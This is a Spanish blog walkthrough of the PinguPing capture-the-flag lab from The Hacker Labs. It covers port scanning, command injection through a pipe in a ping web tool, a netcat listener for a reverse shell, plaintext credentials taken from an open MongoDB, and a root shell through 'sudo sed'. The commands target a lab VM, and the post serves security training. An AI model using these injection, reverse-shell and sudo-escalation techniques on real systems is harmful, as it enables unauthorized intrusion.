---
title: CTF-PinguPing
description: Guia en texto del CTF PinguPing de The hacker Labs, incluye enumeración de puertos, tecnicas de recopilación de información, acceso y escalamiento de privilegios.
date: 2024-06-09 22:00 +/-TTTT
categories: [ES-CTF, The Hacker Labs]
tags: [hacking, tehhackerlabs, ctf, es, avanzado]     # TAG names should always be lowercase
pin: true
math: true
mermaid: true
image:
  path: https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/portada.jpg?raw=true
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---

Guia en texto del CTF Pinguping de The hacker Labs, incluye enumeración de puertos, tecnicas de recopilación de información, metodos de acceso y escalamiento de privilegios.

<!-- Indice -->
**Índice**

1.[Pinguping](#1-pinguping)

2.[Reconocimiento](#2-reconocimiento)

2.1[Conectividad](#21-conectividad)

2.2[Reconocimiento de vulnerabilidades con Nmap](#22-reconocimiento-de-vulnerabilidades-con-nmap)

2.3[Visualización de sisitio web puerto 80](#23-visualizacíón-de-sitio-web-puerto-80)

2.4[Revisión del contenido del puerto 5000](#24-revisión-del-contenido-del-puerto-5000)

3.[Recopilación de Información](#3-recopilación-de-información)

3.1[Validación del funcionamiento del aplicativo web de Ping](#31-validación-del-funcionamiento-del-aplicativo-web-de-ping)

3.2[Prueba de command injection](#32-prueba-de-command-injection)

3.3[Puerta trasera con Netcat](#33-puerta-trasera-con-netcat)

3.4[Accediendo a la base de datos MongoDB](#34-accediendo-a-la-base-de-datos-mongodb)

4.[Acceso al Objetivo](#4-acceso-al-objetivo)

4.1[Conexión SSH](#41-conexión-ssh)

4.2[Primera flag user.txt](#42-primera-flag-usertxt)

5.[Escalamiento de Privilegios](#5-escalamiento-de-privilegios)

5.1[Somos root](#51-somos-root)

5.2[Flag de root](#52-flag-de-root)

6.[Recomendaciones y Conclusiones](#6-recomendaciones-y-conclusiones)



<!-- Inicio del documento -->

## 1. Pinguping

Pinguping es una máquina Virtual es proporcionada por la plataforma web de CTFs The Hacker Labs, agradeciendo su contribución y apoyo a la comunidad para seguir creciendo y aprendiendo sobre este apasionante mundo de la ciberseguridad. **Visitalos:** [The Hacker Labs](https://thehackerslabs.com "the hacker labs")

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/1.jpg?raw=true "pinguping")

Después de descargar la Máquina Virtual, te muestra un archivo .ova el cual, al ejecutarlo, despliega
la máquina virtual en VMware o VirtualBox y automáticamente se asigna una dirección
IP de la red en la que estás trabajando.

| Vm name       | Ip Adress     | Creators  |Nivel |
| :-----------: |:-------------:| :--------:|:--------:|
| PinguPing       | `192.168.1.14`  | The Hacker Labs     |Avanzado|

## 2. Reconocimiento

### 2.1 Conectividad

Lo primero es validar si tenemos llegada al escenario para ello validamos la conectividad hacia el objetivo desde nuestra máquina virtual con la que realizaremos las pruebas y con esto podremos iniciar las pruebas de Ethical Hacking.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# ping 192.168.1.11 -c 4  
PING 192.168.1.11 (192.168.1.11) 56(84) bytes of data.
64 bytes from 192.168.1.11: icmp_seq=1 ttl=64 time=1.23 ms
64 bytes from 192.168.1.11: icmp_seq=2 ttl=64 time=0.095 ms
64 bytes from 192.168.1.11: icmp_seq=3 ttl=64 time=0.098 ms
64 bytes from 192.168.1.11: icmp_seq=4 ttl=64 time=0.094 ms

--- 192.168.1.11 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3052ms
rtt min/avg/max/mdev = 0.094/0.380/1.234/0.492 ms
```

### 2.2 Reconocimiento de vulnerabilidades con Nmap

Se utiliza Nmap para recopilar información que pueda ser usada posteriormente para realizar un ataque, en nuestra busqueda tratamos de identificar versiones de servicio, sistema operativo, el comando utilizado  fue nmap `-sVC 192.168.1.14` como resultado observamos que tenemos los siguientes puertos utilizados por el objetivo `22`, `80`, `5000`.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# nmap -sVC 192.168.1.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 00:50 EDT
Nmap scan report for 192.168.1.14
Host is up (0.00014s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 77:b7:3e:fd:1a:53:71:4b:5d:33:47:17:70:c3:6f:fd (ECDSA)
|_  256 e8:03:cb:1e:21:8a:17:df:71:80:92:eb:72:38:26:25 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Mon, 10 Jun 2024 04:50:23 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1747
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Ping Test</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     background-color: #2c3e50;
|     color: #ecf0f1;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     margin: 0;
|     .container {
|     background-color: #34495e;
|     padding: 20px;
|     border-radius: 10px;
|     box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
|     width: 400px;
|     text-align: center;
|     input[type
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=6/10%Time=66668610%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,782,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Mon,\x2010\x20Jun\x202024\x2004:50:23\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x201747\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Ping\x20Test</title>\n\
SF:x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20s
SF:ans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-
SF:color:\x20#2c3e50;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20col
SF:or:\x20#ecf0f1;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displa
SF:y:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-co
SF:ntent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alig
SF:n-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20he
SF:ight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin
SF::\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:background-color:\x20#34495e;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20padding:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20box-shadow:\x200\x200\x2010px\x20rgba\(0,\x200,\x200,\x200\.5\);\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20400px;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20input\[
SF:type")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=
SF:\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</t
SF:itle>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x
SF:20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x
SF:20\x20\x20</body>\n</html>\n");
MAC Address: 00:0C:29:EE:11:D4 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.82 seconds
```

Bastante contenido que podria marear o distraer pero, vamos parte por parte a los puertos que mas nos llaman la atención el `80` y el `5000`

### 2.3 Visualizacíón de sitio web puerto 80

Vamos a revisar el sitio web proporcionado por el objetivo para buscar algo que nos llame la atención y nos permita abordar el reto.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/2.jpg?raw=true "sitioweb")

Observamos un sitio web tradicional con la página por defecto de la configuración de Apache2.

### 2.4 Revisión del contenido del puerto 5000 

El segundo puerto que nos llamo la atención fue el `5000`, vamos a revisar rapidamente si tiene algun contenido interesante.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/3.jpg?raw=true "port 5000")

observamos un utilitario web para ping, a lo mejor por ahi podriamos hacer un sql injection, command injection o derrepente un path traversal que con el poderoso BurpSuite podriamos obtener mas detalles y agarrar el reto por ahi, vamos a seguir con las pruebas.

## 3. Recopilación de Información

### 3.1 Validación del funcionamiento del aplicativo web de Ping

Vamos a validar el funcionamiento del sitio web y su comportamiento con el codigo fuente.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/4.jpg?raw=true "ping")

funciona correctamente, no observamos nada sospechoso en la url, vamos a ver el código fuente.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/5.jpg?raw=true "código fuente")

### 3.2 Prueba de command injection

Validemos si se puede ejecutar algunos comandos dicionales a ping.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/6.jpg?raw=true "comandos")

No nos permite ejecutar mas comandos probe tambien con algunos comandos adicionales conocidos como `whoami`, `pwd` , `date` pero ninguno respondio a lo mejor hay alguna forma de ejecutarlo.

Despues de estar un rato intentando ¡Bingo!, con pipe `|`pudimos ejecutar comandos.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/7.jpg?raw=true "pipe")

observamos que se pueden ejecutar varios comandos de consulta, pero probaremos si solo eso se puede hacer.

### 3.3 Puerta trasera con Netcat

Una forma muy común de establecer una conexión con un servidor remoto mediante un puerto en especifico es con el poderodo Netcat en esye caso parece posible por la forma en la que se ejecutan los comandos en el aplicativo web.

Primero pongamos un puerto en escucha en nuestro entorno de trabajo, aleatoriamente escogemos el puerto para la `8000`conexión remota.


```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# nc -lnvp 8000
listening on [any] 8000 ...
|
```

Ahora vamos a ejecutar el comando en la aplicación web.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/8.jpg?raw=true "netcat")

Validamos en nuestro entorno de trabajo que tenemos conexión al servidor remoto mediante el usuario `tester`.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# nc -lnvp 8000
listening on [any] 8000 ...
connect to [192.168.1.11] from (UNKNOWN) [192.168.1.14] 46750
pwd
/home/tester
whoami
tester
date
lun 10 jun 2024 08:25:25 CEST
|
```
Analizando lo que tiene el usuario `tester` observamos que tiene un archivo oculto, posible archivo de configuración de MongoDB.

```bash
ls -la 
total 36
drwx------ 5 tester tester 4096 may 20 19:38 .
drwxr-xr-x 5 root   root   4096 may 19 18:57 ..
lrwxrwxrwx 1 root   root      9 may 20 19:38 .bash_history -> /dev/null
-rw-r--r-- 1 tester tester  220 may 19 18:56 .bash_logout
-rw-r--r-- 1 tester tester 3526 may 19 18:56 .bashrc
drwxr-xr-x 3 tester tester 4096 may 19 18:58 Desktop
drwxr-xr-x 3 tester tester 4096 may 19 18:58 .local
drwx------ 3 tester tester 4096 may 19 19:03 .mongodb
-rw-r--r-- 1 tester tester  807 may 19 18:56 .profile
-rw-r--r-- 1 tester tester   66 may 19 19:05 .selected_editor

```
### 3.4 Accediendo a la base de datos MongoDB

Probemos si podemos acceder a la base de datos.

```bash
mongosh
Current Mongosh Log ID:	66664af05d2368cb0d2202d7
Connecting to:		mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+2.2.5
Using MongoDB:		7.0.9
Using Mongosh:		2.2.5
mongosh 2.2.6 is available for download: https://www.mongodb.com/try/download/shell

For mongosh info see: https://docs.mongodb.com/mongodb-shell/

------
   The server generated these startup warnings when booting
   2024-06-10T01:27:01.392+02:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
   2024-06-10T01:27:03.593+02:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
   2024-06-10T01:27:03.594+02:00: /sys/kernel/mm/transparent_hugepage/enabled is 'always'. We suggest setting it to 'never' in this binary version
   2024-06-10T01:27:03.594+02:00: vm.max_map_count is too low
------

test> 
```
Veamos que podemos encontrar.

```bash
test> show dbs
admin      40.00 KiB
config     72.00 KiB
local      72.00 KiB
secretito  56.00 KiB
test> use admin
switched to db admin
admin> show tables
system.version
admin> db.system.version.findOne()
{ _id: 'featureCompatibilityVersion', version: '7.0' }
admin> 
```

Observamos las bases de datos, entre ellas la que mas llama la atención es `secretito`, pero revisaremos una por una para obtener mas información.

```bash
admin> use config
switched to db config
config> show tables
system.sessions
config> db.system.sessions.findOne()
{
  _id: {
    id: UUID('8ba02689-c0f4-4b3d-9cc2-1a680ff69cd8'),
    uid: Binary.createFromBase64('47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=', 0)
  },
  lastUse: ISODate('2024-06-10T06:52:03.616Z')
}
config> 
```

```bash
config> use local
switched to db local
local> show tables
startup_log
local> db.startup_log.findOne()
{
  _id: 'debian-1715868117822',
  hostname: 'debian',
  startTime: ISODate('2024-05-16T14:01:57.000Z'),
  startTimeLocal: 'Thu May 16 16:01:57.822',
  cmdLine: {
    config: '/etc/mongod.conf',
    net: { bindIp: '127.0.0.1', port: 27017 },
    processManagement: { timeZoneInfo: '/usr/share/zoneinfo' },
    storage: { dbPath: '/var/lib/mongodb' },
    systemLog: {
      destination: 'file',
      logAppend: true,
      path: '/var/log/mongodb/mongod.log'
    }
  },
  pid: Long('3540'),
  buildinfo: {
    version: '7.0.9',
    gitVersion: '3ff3a3925c36ed277cf5eafca5495f2e3728dd67',
    modules: [],
    allocator: 'tcmalloc',
    javascriptEngine: 'mozjs',
    sysInfo: 'deprecated',
    versionArray: [ 7, 0, 9, 0 ],
    openssl: {
      running: 'OpenSSL 3.0.11 19 Sep 2023',
      compiled: 'OpenSSL 3.0.11 19 Sep 2023'
    },
    buildEnvironment: {
      distmod: 'debian12',
      distarch: 'x86_64',
      cc: '/opt/mongodbtoolchain/v4/bin/gcc: gcc (GCC) 11.3.0',
      ccflags: '-Werror -include mongo/platform/basic.h -ffp-contract=off -fasynchronous-unwind-tables -g2 -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -gdwarf-5 -fno-omit-frame-pointer -fno-strict-aliasing -O2 -march=sandybridge -mtune=generic -mprefer-vector-width=128 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -gdwarf64 -Wa,--nocompress-debug-sections -fno-builtin-memcmp -Wimplicit-fallthrough=5',
      cxx: '/opt/mongodbtoolchain/v4/bin/g++: g++ (GCC) 11.3.0',
      cxxflags: '-Woverloaded-virtual -Wpessimizing-move -Wno-maybe-uninitialized -fsized-deallocation -Wno-deprecated -std=c++20',
      linkflags: '-Wl,--fatal-warnings -B/opt/mongodbtoolchain/v4/bin -gdwarf-5 -pthread -Wl,-z,now -fuse-ld=lld -fstack-protector-strong -gdwarf64 -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro -Wl,--compress-debug-sections=none -Wl,-z,origin -Wl,--enable-new-dtags',
      target_arch: 'x86_64',
      target_os: 'linux',
      cppdefines: 'SAFEINT_USE_INTRINSICS 0 PCRE2_STATIC NDEBUG _XOPEN_SOURCE 700 _GNU_SOURCE _FORTIFY_SOURCE 2 ABSL_FORCE_ALIGNED_ACCESS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_FILESYSTEM_NO_CXX20_ATOMIC_REF BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_SYSTEM_NO_DEPRECATED BOOST_THREAD_USES_DATETIME BOOST_THREAD_VERSION 5'
    },
    bits: 64,
    debug: false,
    maxBsonObjectSize: 16777216,
    storageEngines: [ 'devnull', 'wiredTiger' ]
  }
}
local> 
```

```bash
local> use secretito
switched to db secretito
secretito> show tables
usuarios
secretito> db.usuarios.findOne()
{
  _id: ObjectId('6646123704d62681cf2202d8'),
  usuario: 'secretote',
  'contraseña': 'GraciasPorVenirAhoraVayase'
}
secretito> 

```

Excelente, dentro de secretito encontramos las credenciales de un usuario que podriamos probar para conectarnos al objetivo.

## 4. Acceso al Objetivo

### 4.1 Conexión SSH

Con el usuario obtenido, probaremos la conexión SSH al objetivo, sabiendo que tenemos el servicio y el puerto disponibles.

`usuario:secretote` `contraseña:GraciasPorVenirAhoraVayase `

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# ssh secretote@192.168.1.14 
The authenticity of host '192.168.1.14 (192.168.1.14)' can't be established.
ED25519 key fingerprint is SHA256:occn1S8ce6/OTS6AMuQ/lwYzKsO7SVkN2tJuUfHQ5/A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.14' (ED25519) to the list of known hosts.
secretote@192.168.1.14's password: 
Linux pinguping 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
secretote@pinguping:~$ 
```

### 4.2 Primera flag user.txt

Buscaremos la primera flag.

```bash
secretote@pinguping:~$ ls
user.txt
secretote@pinguping:~$ cat user.txt 
753a3e39fde0e31a5e763384d9a1df87  
```

`753a3e39fde0e31a5e763384d9a1df87`

## 5. Escalamiento de Privilegios

### 5.1 Somos root

Para obtener privilegios de root primero debemos saber cuales son los comandos que estamos autorizado a ejecutar con permisos elevados para esto nos ayudamos con el comando sudo.

```bash
secretote@pinguping:~$ sudo -l
[sudo] contraseña para secretote: 
Matching Defaults entries for secretote on pinguping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User secretote may run the following commands on pinguping:
    (ALL : ALL) /usr/bin/sed
```

Obervamos que se puede ejecutar `/usr/bin/sed` sin permisos de root. Ahora tenemos que buscar algún binario con este comando que nos de los privilegios de root.

Para esto, nos ayudaremos de la siempre confiable [Gtfobins](https://gtfobins.github.io/gtfobins/node/ "gtfobins"), donde buscaremos lo que necesitamos en su amplio catálogo de binarios. Este excelente sitio web nos proporciona una variedad de binarios útiles para nuestras necesidades.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/PinguPing/9.jpg?raw=true "gtfobins")

Listo, con esto podremos probar si nos proporciona lo privilegios de root.

```bash
secretote@pinguping:~$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
# pwd
/home/secretote
# whoami
root
```

Excelente, somos root.

### 5.2 Flag de root

Ahora que somos root buscamos las flag correspondentes para culminar este reto.

```bash
# cat root.txt	
3e3fe08f2c9be56153e6e470199787c5
# 
```

`3e3fe08f2c9be56153e6e470199787c5`

## 6. Recomendaciones y Conclusiones

* Es importante siempre avanzar parte por parte ante lo que vayas descubriendo y pensar qué técnica puedes aplicar ante lo que vas encontrando. Para ello, es siempre fundamental aprender diversos métodos de ataque y su funcionamiento, para tener más ángulos de cómo afrontar el problema y darle la solución más efectiva.

* Siempre el agradecimiento a [The Hacker Labs](https://thehackerslabs.com "the hacker labs") por el esfuerzo que hacen en la plataforma para que la comunidad pueda seguir aprendiendo en escenarios seguros.

Saludos!

**!Hack the life!**